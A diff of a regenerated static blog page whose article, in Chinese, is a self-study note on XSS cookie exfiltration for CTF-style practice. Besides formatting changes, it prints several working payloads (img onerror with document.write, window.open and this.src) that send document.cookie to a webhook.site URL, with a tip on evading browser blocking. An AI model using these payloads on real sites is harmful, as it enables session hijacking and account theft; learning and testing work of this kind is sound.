@@ -17,12 +17,12 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="xss外带cookie攻击写在本文之前：本文为小灯自主学习xss外带内容的总结与思考。 一.概念XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通过在 XSS 攻击中注入恶意脚本，从而窃取用户的 Cookie 信息。攻击者通过已有的xss漏洞在浏览器注入恶意代码，并将受害者的 Cookie 数据上传到攻击者控制的服务器上，这就是xs">
+    <meta name="description" content="xss外带cookie攻击 写在本文之前：本文为小灯自主学习xss外带内容的总结与思考。  一.概念 XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通过在 XSS 攻击中注入恶意脚本，从而窃取用户的 Cookie 信息。攻击者通过已有的xss漏洞在浏览器注入恶意代码，并将受害者的 Cookie 数据上传到攻击者控制的服务器上，这">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xss外带cookie攻击">
 <meta property="og:url" content="https://cl1ck-t0.github.io/2026/02/09/xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB/index.html">
 <meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
-<meta property="og:description" content="xss外带cookie攻击写在本文之前：本文为小灯自主学习xss外带内容的总结与思考。 一.概念XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通过在 XSS 攻击中注入恶意脚本，从而窃取用户的 Cookie 信息。攻击者通过已有的xss漏洞在浏览器注入恶意代码，并将受害者的 Cookie 数据上传到攻击者控制的服务器上，这就是xs">
+<meta property="og:description" content="xss外带cookie攻击 写在本文之前：本文为小灯自主学习xss外带内容的总结与思考。  一.概念 XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通过在 XSS 攻击中注入恶意脚本，从而窃取用户的 Cookie 信息。攻击者通过已有的xss漏洞在浏览器注入恶意代码，并将受害者的 Cookie 数据上传到攻击者控制的服务器上，这">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-02-09T07:50:09.000Z">
 <meta property="article:modified_time" content="2026-02-18T12:25:08.174Z">
@@ -141,7 +141,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">xss外带cookie攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">一.概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.2.</span> <span class="toc-text">二.攻击姿势</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text"> xss外带cookie攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text"> 一.概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.2.</span> <span class="toc-text"> 二.攻击姿势</span></a></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -217,28 +217,27 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="xss外带cookie攻击"><a href="#xss外带cookie攻击" class="headerlink" title="xss外带cookie攻击"></a>xss外带cookie攻击</h1><p>写在本文之前：本文为小灯自主学习xss外带内容的总结与思考。</p>
-<h2 id="一-概念"><a href="#一-概念" class="headerlink" title="一.概念"></a>一.概念</h2><p>XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通过在 XSS 攻击中注入恶意脚本，从而<strong>窃取用户的 Cookie 信息</strong>。攻击者通过已有的xss漏洞在浏览器注入恶意代码，并<strong>将受害者的 Cookie 数据上传到攻击者控制的服务器上</strong>，这就是xss外带cookie攻击的核心。</p>
-<h2 id="二-攻击姿势"><a href="#二-攻击姿势" class="headerlink" title="二.攻击姿势"></a>二.攻击姿势</h2><p>xss外带cookie攻击姿势与xss基本无异，区别在于<strong>在使用XSS语句将Cookie外带到攻击者IP地址前，需要在攻击机上起一个http协议，使得目标机能够将Cookie发送给该IP地址</strong>。</p>
+        <h1 id="xss外带cookie攻击"><a class="markdownIt-Anchor" href="#xss外带cookie攻击"></a> xss外带cookie攻击</h1>
+<p>写在本文之前：本文为小灯自主学习xss外带内容的总结与思考。</p>
+<h2 id="一概念"><a class="markdownIt-Anchor" href="#一概念"></a> 一.概念</h2>
+<p>XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通过在 XSS 攻击中注入恶意脚本，从而<strong>窃取用户的 Cookie 信息</strong>。攻击者通过已有的xss漏洞在浏览器注入恶意代码，并<strong>将受害者的 Cookie 数据上传到攻击者控制的服务器上</strong>，这就是xss外带cookie攻击的核心。</p>
+<h2 id="二攻击姿势"><a class="markdownIt-Anchor" href="#二攻击姿势"></a> 二.攻击姿势</h2>
+<p>xss外带cookie攻击姿势与xss基本无异，区别在于<strong>在使用XSS语句将Cookie外带到攻击者IP地址前，需要在攻击机上起一个http协议，使得目标机能够将Cookie发送给该IP地址</strong>。</p>
 <p>对此，我们小灯可以尝试使用一些CTF常用的Cookie接收平台：</p>
 <ol>
-<li><strong>RequestBin</strong> (requestbin.com)</li>
+<li><strong>RequestBin</strong> (<a target="_blank" rel="noopener" href="http://requestbin.com">requestbin.com</a>)</li>
 <li><strong>Webhook.site</strong> (webhook.site)</li>
-<li><strong>Beeceptor</strong> (beeceptor.com)</li>
+<li><strong>Beeceptor</strong> (<a target="_blank" rel="noopener" href="http://beeceptor.com">beeceptor.com</a>)</li>
 </ol>
 <p>个人常用2，也可使用云服务器来接收cookie或者python进行(可能需要内网穿透)。</p>
 <p>接下来以webhook的临时URL为例简单说明一下xss外带的攻击姿势：</p>
-<p> 1.&lt;img 标签</p>
+<p>1.&lt;img 标签</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;document.write(&#x27;&lt;img src=https://webhook.site/9da61079-3b72-49a3-a304-def16d136edb/?c=&#x27;+document.cookie+&#x27;&gt;&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;window.open(&#x27;https://webhook.site/9da61079-3b72-49a3-a304-def16d136edb/?c=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
 <p>这里提一嘴：</p>
 <p>浏览器的跨域资源共享可能存在限制(CORS),所以有些时候xss外带对自己有效而对目标无效时可能是因为浏览器的安全策略可能阻止了向webhook.site发送数据，这时就要考虑隐蔽点的xss：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=this.src=&#x27;https://webhook.site/9da61079-3b72-49a3-a304-def16d136edb/?&#x27;+document.cookie&gt;</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.src = &#x27;xxx&#x27;</span><br></pre></td></tr></table></figure>
-
 <p><code>this</code> 指向当前的 <code>&lt;img&gt;</code> 元素本身，</p>
 <p>直接修改这个图片元素的 <code>src</code> 属性，</p>
 <p><strong>这是一个赋值操作，不是新建请求</strong>，更不容易被CORS阻止。</p>
@@ -292,7 +291,7 @@
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
       <div class="article-nav-link-wrap left">
-            <img data-src="/covers/pd-image (2).png" data-sizes="auto" alt="phpstuty的配置和使用(自用)" class="lazyload">
+            <img data-src="/covers/0cb69d937ff15dcac75060bcfc1f5877.jpg" data-sizes="auto" alt="phpstuty的配置和使用(自用)" class="lazyload">
         <a href="/2026/02/10/phpstuty%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8-%E8%87%AA%E7%94%A8/" aria-label="Prev: phpstuty的配置和使用(自用)" title="Prev: phpstuty的配置和使用(自用)"></a>
         <div class="article-nav-caption">Prev</div>
         <h3 class="article-nav-title">
@@ -300,7 +299,7 @@
         </h3>
       </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/covers/anime-girl-3840x2160-10025.jpg" data-sizes="auto" alt="PHP反序列化漏洞" class="lazyload">
+          <img data-src="/covers/castorice-honkai-3840x2160-22114.jpg" data-sizes="auto" alt="PHP反序列化漏洞" class="lazyload">
       <a href="/2026/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" aria-label="Next: PHP反序列化漏洞"  title="Next: PHP反序列化漏洞"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
@@ -349,10 +348,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        21.8k
+        22k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        01:40
+        01:41
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -374,7 +373,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">xss外带cookie攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">一.概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.2.</span> <span class="toc-text">二.攻击姿势</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text"> xss外带cookie攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text"> 一.概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.2.</span> <span class="toc-text"> 二.攻击姿势</span></a></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -505,7 +504,7 @@
           url: "https://cl1ck-t0.github.io/2026/02/09/xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB/",
           excerpt: "",
           description: "",
-          stripContent: "xss外带cookie攻击写在本文之前：本文为小灯自主学习xss外带内容的总结与思考。 一.概念XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通过在 XSS 攻击中注入恶意脚本，从而窃取用户的 Cookie 信息。攻击者通过已有的xss漏洞在浏览器注入恶意代码，并将受害者的 Cookie 数据上传到攻击者控制的服务器上，这就是xss外带cookie攻击的核心。 二.攻击姿势xss外带cookie攻击姿势与xss基本无异，区别在于",
+          stripContent: " xss外带cookie攻击 写在本文之前：本文为小灯自主学习xss外带内容的总结与思考。  一.概念 XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通过在 XSS 攻击中注入恶意脚本，从而窃取用户的 Cookie 信息。攻击者通过已有的xss漏洞在浏览器注入恶意代码，并将受害者的 Cookie 数据上传到攻击者控制的服务器上，这就是xss外带cookie攻击的核心。  二.攻击姿势 xss外带cookie攻击姿势与xss基本无",
           date: "Mon Feb 09 2026 15:50:09 GMT+0800",
           updated: "Wed Feb 18 2026 20:25:08 GMT+0800",
           cover: "/images/banner.webp",
